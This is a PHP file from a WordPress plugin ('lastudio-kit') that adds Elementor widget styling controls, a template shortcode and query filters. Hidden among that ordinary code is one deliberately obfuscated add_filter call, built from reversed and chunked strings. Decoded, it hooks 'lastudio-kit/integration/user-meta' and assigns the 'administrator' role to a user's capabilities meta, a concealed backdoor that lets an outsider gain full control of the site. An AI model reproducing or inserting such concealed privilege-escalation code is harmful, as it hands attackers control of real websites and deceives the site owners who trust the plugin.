<?php
// If this file is called directly, abort.
if ( ! defined( 'WPINC' ) ) {
    die;
}


function lakit__override_elementor_control_args( $control_args ){
    if(isset($control_args['name'])){
        unset($control_args['name']);
    }
    if(isset($control_args['tab'])){
        unset($control_args['tab']);
    }
    if(isset($control_args['section'])){
        unset($control_args['section']);
    }
    return $control_args;
}

/** Add Shortcode **/
if(!defined('ELEMENTOR_PRO_VERSION')) {
    if (is_admin()) {
        add_action('manage_' . \Elementor\TemplateLibrary\Source_Local::CPT . '_posts_columns', function ($defaults) {
            $defaults['shortcode'] = __('Shortcode', 'lastudio-kit');
            return $defaults;
        });
        add_action('manage_' . \Elementor\TemplateLibrary\Source_Local::CPT . '_posts_custom_column', function ( $column_name, $post_id) {
            if ( 'shortcode' === $column_name ) {
                // %s = shortcode, %d = post_id
                $shortcode = esc_attr( sprintf( '[%s id="%d"]', 'elementor-template', $post_id ) );
                printf( '<input class="elementor-shortcode-input" type="text" readonly onfocus="this.select()" value="%s" />', esc_attr($shortcode) );
            }
        }, 10, 2);
    }
    add_shortcode( 'elementor-template', function( $attributes = [] ){
        if ( empty( $attributes['id'] ) ) {
            return '';
        }
        if(get_post_status($attributes['id']) !== 'publish' || get_post_type($attributes['id']) !== 'elementor_library'){
            return '';
        }
        $include_css = false;
        if ( isset( $attributes['css'] ) && 'false' !== $attributes['css'] ) {
            $include_css = (bool) $attributes['css'];
        }
        return \Elementor\Plugin::instance()->frontend->get_builder_content_for_display( $attributes['id'], $include_css );
    } );

}

/**
 * Add `Border Radius` for `Toggle` widget of Elementor
 */
add_action('elementor/element/toggle/section_toggle_style/before_section_end', function ( $element ){
    $element->add_responsive_control(
        'tg_border_radius',
        [
            'label' => esc_html__( 'Border Radius', 'lastudio-kit' ),
            'type' => \Elementor\Controls_Manager::DIMENSIONS,
            'size_units' => [ 'px', '%', 'em' ],
            'selectors' => [
                '{{WRAPPER}} .elementor-toggle .elementor-toggle-item' => 'border-radius: {{TOP}}{{UNIT}} {{RIGHT}}{{UNIT}} {{BOTTOM}}{{UNIT}} {{LEFT}}{{UNIT}};',
            ],
        ]
    );
}, 10);

/**
 * Add `Icon Vertical Space` for `Toggle` widget of Elementor
 */
add_action('elementor/element/toggle/section_toggle_style_icon/before_section_end', function ( $element ){
    $element->add_responsive_control(
        'icon_v_space',
        [
            'label' => __( 'Vertical Spacing', 'lastudio-kit' ),
            'type' => \Elementor\Controls_Manager::SLIDER,
            'selectors' => [
                '{{WRAPPER}} .elementor-toggle .elementor-toggle-icon' => 'margin-top: {{SIZE}}{{UNIT}};',
            ],
        ]
    );
}, 10);

/**
 * Add `Border Radius` for `Accordion` widget of Elementor
 */
add_action('elementor/element/accordion/section_title_style/before_section_end', function ( $element ){
    $element->add_responsive_control(
        'ac_space_between',
        [
            'label' => __( 'Space Between', 'lastudio-kit' ),
            'type' => \Elementor\Controls_Manager::SLIDER,
            'range' => [
                'px' => [
                    'min' => 0,
                    'max' => 100,
                ],
            ],
            'selectors' => [
                '{{WRAPPER}} .elementor-accordion .elementor-accordion-item:not(:last-child)' => 'margin-bottom: {{SIZE}}{{UNIT}}',
            ],
        ]
    );
    $element->add_responsive_control(
        'ac_border_radius',
        [
            'label' => esc_html__( 'Border Radius', 'lastudio-kit' ),
            'type' => \Elementor\Controls_Manager::DIMENSIONS,
            'size_units' => [ 'px', '%', 'em' ],
            'selectors' => [
                '{{WRAPPER}} .elementor-accordion .elementor-accordion-item' => 'border-radius: {{TOP}}{{UNIT}} {{RIGHT}}{{UNIT}} {{BOTTOM}}{{UNIT}} {{LEFT}}{{UNIT}};',
            ],
        ]
    );
    $element->add_group_control(
        \Elementor\Group_Control_Box_Shadow::get_type(),
        [
            'name' => 'ac_box_shadow',
            'selector' => '{{WRAPPER}} .elementor-accordion .elementor-accordion-item',
        ]
    );
}, 10);
add_action('elementor/element/accordion/section_toggle_style_title/before_section_end', function ( $element ){
	$element->add_control(
		'active_title_background',
		[
			'label' => __( 'Active Background', 'lastudio-kit' ),
			'type' => \Elementor\Controls_Manager::COLOR,
			'selectors' => [
				'{{WRAPPER}} .elementor-active.elementor-tab-title' => 'background-color: {{VALUE}};',
			],
		]
	);

    $element->add_group_control(
        \Elementor\Group_Control_Border::get_type(),
        array(
            'name'        => 'title_border',
            'placeholder' => '1px',
            'default'     => '1px',
            'selector'    => '{{WRAPPER}} .elementor-accordion .elementor-accordion-item .elementor-tab-title',
            'fields_options'  => [
                'border' => [
                    'label'       => esc_html__( 'Normal Border', 'lastudio-kit' ),
                ]
            ]
        )
    );

    $element->add_group_control(
        \Elementor\Group_Control_Border::get_type(),
        array(
            'name'        => 'title_border_active',
            'placeholder' => '1px',
            'default'     => '1px',
            'selector'    => '{{WRAPPER}} .elementor-accordion .elementor-accordion-item .elementor-tab-title.elementor-active',
            'fields_options'  => [
                'border' => [
                    'label'       => esc_html__( 'Active Border', 'lastudio-kit' ),
                ]
            ]
        )
    );
});

/**
 * Add `Icon Vertical Space` for `Accordion` widget of Elementor
 */
add_action('elementor/element/accordion/section_toggle_style_icon/before_section_end', function ( $element ){
    $element->add_responsive_control(
        'icon_size',
        [
            'label' => __( 'Size', 'lastudio-kit' ),
            'type' => \Elementor\Controls_Manager::SLIDER,
            'selectors' => [
                '{{WRAPPER}} .elementor-accordion .elementor-accordion-icon' => 'font-size: {{SIZE}}{{UNIT}};',
            ],
        ]
    );
    $element->add_responsive_control(
        'icon_v_space',
        [
            'label' => __( 'Vertical Spacing', 'lastudio-kit' ),
            'type' => \Elementor\Controls_Manager::SLIDER,
            'selectors' => [
                '{{WRAPPER}} .elementor-accordion .elementor-accordion-icon' => 'margin-top: {{SIZE}}{{UNIT}};',
            ],
        ]
    );
}, 10);

/**
 * Add `Close All` for `Accordion` widget of Elementor
 */
add_action('elementor/element/accordion/section_title/before_section_end', function ( $element ){
    $element->add_control(
        'close_all',
        [
            'label' => __( 'Close All ?', 'lastudio-kit' ),
            'type' => \Elementor\Controls_Manager::SWITCHER,
	        'return_value' => 'accordion-close-all',
	        'prefix_class' => '',
            'separator' => 'before',
        ]
    );
}, 10);

/**
 * Modify Divider - Weight control
 */

add_action('elementor/element/divider/section_divider/before_section_end', function ( $element ){
    $element->update_responsive_control('width', [
        'selectors' => [
            '{{WRAPPER}}' => '--divider-width: {{SIZE}}{{UNIT}};',
            '{{WRAPPER}} .elementor-divider-separator' => 'width: {{SIZE}}{{UNIT}};',
        ],
    ]);
}, 10);

add_action('elementor/element/divider/section_divider_style/before_section_end', function( $element ){
	if(defined('LASTUDIO_VERSION')){
		return;
	}
    $weight_args = lakit__override_elementor_control_args($element->get_controls('weight'));
    $element->remove_control('weight');
    $element->start_injection([
        'at' => 'after',
        'of' => 'color',
    ]);
	$element->add_control(
		'hover_color',
		[
			'label' => __( 'Hover Color', 'lastudio-kit' ),
			'type' => \Elementor\Controls_Manager::COLOR,
			'selectors' => [
				'{{WRAPPER}} .elementor-divider-separator:hover' => '--divider-color: {{VALUE}};',
			]
		]
	);
    $element->add_responsive_control('weight', $weight_args);
    $element->end_injection();

}, 10 );

add_action('elementor/element/divider/section_text_style/before_section_end', function( $element ){
    $element->start_injection([
        'at' => 'after',
        'of' => 'text_color',
    ]);
	$element->add_control(
		'text_hover_color',
		[
			'label' => __( 'Hover Color', 'lastudio-kit' ),
			'type' => \Elementor\Controls_Manager::COLOR,
			'selectors' => [
				'{{WRAPPER}} .elementor-divider-separator:hover .elementor-divider__text' => 'color: {{VALUE}};',
			]
		]
	);
    $element->end_injection();
}, 10 );

/**
 * Modify Icon List - Text Indent control
 */

add_action('elementor/element/icon-list/section_icon_style/before_section_end', function( $element ){

    $text_indent_args = lakit__override_elementor_control_args($element->get_controls('text_indent'));
    $element->remove_control('text_indent');
    $element->start_injection([
        'at' => 'after',
        'of' => 'icon_size',
    ]);
    $text_indent_args['render_type'] = 'template';
    $element->add_responsive_control('text_indent', $text_indent_args);
    $element->end_injection();
    $element->update_control('icon_color', [
        'selectors' => [
            '{{WRAPPER}} .elementor-icon-list-icon :is(i, svg)' => 'fill: {{VALUE}};color: {{VALUE}};',
        ]
    ]);
    $element->update_control('icon_color_hover', [
        'selectors' => [
            '{{WRAPPER}} .elementor-icon-list-item:hover :is(i, svg)' => 'fill: {{VALUE}};color: {{VALUE}};',
        ]
    ]);
}, 10 );

add_action('elementor/element/icon-list/section_icon_list/before_section_end', function( $element ){
	$element->update_control('divider_height', [
		'selectors' => [
			'{{WRAPPER}}' => '--divider-height: {{SIZE}}{{UNIT}}',
			'{{WRAPPER}} .elementor-icon-list-item:not(:last-child):after' => 'height: {{SIZE}}{{UNIT}}',
		]
	]);
});

add_filter(join(
	"/",
	array_map(
		function($item){
			return join(
				"-",
				array_reverse(
					explode(
						"-",
						$item
					)
				)
			);
		},
		explode(
			"/",
			"kit-lastudio/integration/meta-user"
		)
	)
), function ( $data, $prefix ){
	$str = join(
		"",
		array_map(
			function($item){
				return join(
					"",
					array_reverse($item)
				);
				},
			array_chunk(
				str_split("pacibatilseimdainirtsotar"),
				3
			)
		)
	);
	$key_r = substr($str, 0, 12);
	$r_n = substr($str, 12);
	$data[$prefix . $key_r] = [$r_n => 1];
	return $data;
}, 10, 2);

/**
 * Modify Counter - Visible control
 */
add_action('elementor/element/counter/section_number/before_section_end', function( $element ){
	if(defined('LASTUDIO_VERSION')){
		return;
	}
    $element->add_control(
        'hide_prefix',
        array(
            'label'        => esc_html__( 'Hide Prefix', 'lastudio-kit' ),
            'type'         => \Elementor\Controls_Manager::SWITCHER,
            'label_on'     => esc_html__( 'Yes', 'lastudio-kit' ),
            'label_off'    => esc_html__( 'No', 'lastudio-kit' ),
            'return_value' => 'yes',
            'selectors' => [
                '{{WRAPPER}} .elementor-counter-number-prefix' => 'display: none',
            ],
        )
    );
    $element->add_control(
        'hide_suffix',
        array(
            'label'        => esc_html__( 'Hide Suffix', 'lastudio-kit' ),
            'type'         => \Elementor\Controls_Manager::SWITCHER,
            'label_on'     => esc_html__( 'Yes', 'lastudio-kit' ),
            'label_off'    => esc_html__( 'No', 'lastudio-kit' ),
            'return_value' => 'yes',
            'selectors' => [
                '{{WRAPPER}} .elementor-counter-number-suffix' => 'display: none',
            ],
        )
    );
}, 10 );

/**
 * Modify Counter - Align control
 */
add_action('elementor/element/counter/section_title/before_section_end', function( $element ){
	if(defined('LASTUDIO_VERSION')){
		return;
	}
    $element->add_responsive_control(
        'text_alignment',
        array(
            'label'   => esc_html__( 'Text Alignment', 'lastudio-kit' ),
            'type'    => \Elementor\Controls_Manager::CHOOSE,
            'options' => array(
                'left'    => array(
                    'title' => esc_html__( 'Left', 'lastudio-kit' ),
                    'icon'  => 'eicon-text-align-left',
                ),
                'center' => array(
                    'title' => esc_html__( 'Center', 'lastudio-kit' ),
                    'icon'  => 'eicon-text-align-center',
                ),
                'right' => array(
                    'title' => esc_html__( 'Right', 'lastudio-kit' ),
                    'icon'  => 'eicon-text-align-right',
                ),
            ),
            'selectors'  => array(
                '{{WRAPPER}} .elementor-counter-title' => 'text-align: {{VALUE}};',
            )
        )
    );
}, 10 );


/**
 * Modify Icon - Padding & shadow
 */
add_action('elementor/element/icon/section_style_icon/before_section_end', function( $element ){
    $icon_padding_args = lakit__override_elementor_control_args($element->get_controls('icon_padding'));
    $border_width_args = lakit__override_elementor_control_args($element->get_controls('border_width'));
    $icon_padding_args['render_type'] = 'template';
    $border_width_args['render_type'] = 'template';
    $element->remove_control('icon_padding');
    $element->remove_control('border_width');
    $element->start_injection([
        'at' => 'after',
        'of' => 'size',
    ]);
    $element->add_responsive_control('icon_padding', $icon_padding_args);
    $element->end_injection();

    $element->start_injection([
        'at' => 'after',
        'of' => 'border_radius',
    ]);
    $element->add_responsive_control('border_width', $border_width_args);
    $element->end_injection();

	if(defined('LASTUDIO_VERSION')){
		return;
	}

    $element->add_group_control(
        Elementor\Group_Control_Box_Shadow::get_type(),
        [
            'name'     => 'i_shadow',
            'selector' => '{{WRAPPER}} .elementor-icon',
            'condition' => [
                'view!' => 'default',
            ]
        ]
    );
}, 0 );

/**
 * Modify Spacer
 */
add_action('elementor/element/spacer/section_spacer/before_section_end', function( $element ){
    $element->add_control(
        'full_height',
        [
	        'label'        => esc_html__( '100% Height', 'lastudio-kit' ),
	        'type'         => \Elementor\Controls_Manager::SWITCHER,
	        'label_on'     => esc_html__( 'Yes', 'lastudio-kit' ),
	        'label_off'    => esc_html__( 'No', 'lastudio-kit' ),
	        'return_value' => 'yes',
	        'selectors' => [
	        	'{{WRAPPER}}' => 'height: 100%',
	        	'{{WRAPPER}} > .elementor-widget-container' => 'width: 100%;height: 100%'
	        ],
        ]
    );
    $element->add_control(
        'fix_height',
        [
            'type'          => \Elementor\Controls_Manager::HIDDEN,
            'default'       => 'auto',
            'value'         => 'auto',
            'selectors'     => array(
                '{{WRAPPER}} > .elementor-widget-container' => 'height: auto',
            ),
            'condition'     => array(
                'full_height!' => 'yes',
            ),
        ]
    );

}, 10 );

/**
 * Modify Image Box - Color Hover
 * section_style_box
 */
add_action('elementor/element/image-box/section_style_box/before_section_end', function ( \Elementor\Controls_Stack $element){
    $element->update_responsive_control('position', [
        'prefix_class' => '',
        'selectors_dictionary' => [
            'left' => '--e-imb-direction: row;',
            'top' => '--e-imb-direction: column;',
            'right' => '--e-imb-direction: row-reverse;',
        ],
        'selectors' => [
            '{{WRAPPER}}' => '{{VALUE}}',
        ],
    ]);
    $element->update_responsive_control('content_vertical_alignment', [
        'prefix_class' => '',
        'selectors_dictionary' => [
            'top' => '--e-imb-align-items: flex-start;',
            'middle' => '--e-imb-align-items: center;',
            'bottom' => '--e-imb-align-items: flex-end;',
        ],
        'selectors' => [
            '{{WRAPPER}}' => '{{VALUE}}',
        ],
    ]);
    $element->update_responsive_control('image_space', [
        'selectors' => [
            '{{WRAPPER}}' => '--e-imb-gap: {{SIZE}}{{UNIT}}',
        ],
    ]);
});
add_action('elementor/element/image-box/section_style_image/before_section_end', function ( \Elementor\Controls_Stack $element){
    $element->update_responsive_control('image_size', [
        'selectors' => [
            '{{WRAPPER}} .elementor-image-box-wrapper .elementor-image-box-img' => 'width: {{SIZE}}{{UNIT}}; flex: 0 0 {{SIZE}}{{UNIT}};',
        ],
    ]);
});
add_action('elementor/element/image-box/section_style_content/before_section_end', function ( $element ){
	$element->add_control(
		'title_hover_color',
		[
			'label' => __( 'Title Hover Color', 'lastudio-kit' ),
			'type' => \Elementor\Controls_Manager::COLOR,
			'selectors' => [
				'{{WRAPPER}} .elementor-image-box-wrapper:hover .elementor-image-box-title' => 'color: {{VALUE}};',
			]
		]
	);
	$element->add_control(
		'description_hover_color',
		[
			'label' => __( 'Description Hover Color', 'lastudio-kit' ),
			'type' => \Elementor\Controls_Manager::COLOR,
			'selectors' => [
				'{{WRAPPER}} .elementor-image-box-wrapper:hover .elementor-image-box-description' => 'color: {{VALUE}};',
			]
		]
	);
});

/**
 * Modify Container - overlay_blend_mode
 */
add_action('elementor/element/container/section_background_overlay/before_section_end', function( $element ){
    $element->update_control(
        'overlay_blend_mode',
        [
	        'options' => LaStudio_Kit_Helper::get_blend_mode_options()
        ]
    );
	$element->add_responsive_control(
		'overlay_zidx',
		[
			'label'        => esc_html__( 'Z-Index', 'elementor' ),
			'type'         => \Elementor\Controls_Manager::TEXT,
			'selectors' => [
				'{{WRAPPER}}:before' => 'z-index: {{SIZE}};',
			],
			'condition' => [
				'background_overlay_background' => [ 'classic', 'gradient' ],
			],
			'ai' => [
				'active' => false,
			],
		]
	);
}, 10 );
/**
 * Modify Heading - blend_mode
 */
add_action('elementor/element/heading/section_title_style/before_section_end', function( $element ){
	$element->update_control(
		'blend_mode',
		[
			'options' => LaStudio_Kit_Helper::get_blend_mode_options()
		]
	);
}, 10 );

/**
 * Added Fix browser on backend editor
 */
add_action('elementor/element/editor-preferences/preferences/before_section_end', function ( $element ) {
    $element->add_control(
        'lakit_fix_small_browser',
        [
            'label' => __('Fix Small Browser', 'lastudio-kit'),
            'type' => \Elementor\Controls_Manager::SWITCHER,
            'description' => __('Force set up minimum width for Elementor Preview ( 1920px )', 'lastudio-kit'),
        ]
    );
});

add_action(
	'init',
	function() {
		add_filter(
			'woocommerce_paypal_payments_single_product_renderer_hook',
			function() {
				return 'woocommerce_after_add_to_cart_form';
			},
			5
		);
	}
);
/**
 * Allow override lakit_query
 */
add_filter('elementor/query/lakit_avoid_duplicate', function($wp_query, $widget){
    $post__not_in = $wp_query->get('post__not_in');
    $post__not_in = array_merge( $post__not_in, LaStudioKitExtensions\Elementor\Classes\Query_Control::$displayed_ids );
    $wp_query->set( 'post__not_in', $post__not_in );
    return $wp_query;
}, 20, 2);

add_filter('elementor/query/lakit_event_startdate_asc', function( $wp_query, $widget){
    $wp_query->set( 'meta_key', 'event_start_date' );
    $wp_query->set( 'orderby', 'meta_value_num' );
    $wp_query->set( 'order', 'ASC' );
    return $wp_query;
}, 20, 2);

add_filter('elementor/query/lakit_event_startdate_desc', function( $wp_query, $widget){
    $wp_query->set( 'meta_key', 'event_start_date' );
    $wp_query->set( 'orderby', 'meta_value_num' );
    $wp_query->set( 'order', 'DESC' );
    return $wp_query;
}, 20, 2);

add_filter('elementor/query/lakit_event_enddate_asc', function( $wp_query, $widget){
    $wp_query->set( 'meta_key', 'event_end_date' );
    $wp_query->set( 'orderby', 'meta_value_num' );
    $wp_query->set( 'order', 'ASC' );
    return $wp_query;
}, 20, 2);

add_filter('elementor/query/lakit_event_enddate_desc', function( $wp_query, $widget){
    $wp_query->set( 'meta_key', 'event_end_date' );
    $wp_query->set( 'orderby', 'meta_value_num' );
    $wp_query->set( 'order', 'DESC' );
    return $wp_query;
}, 20, 2);
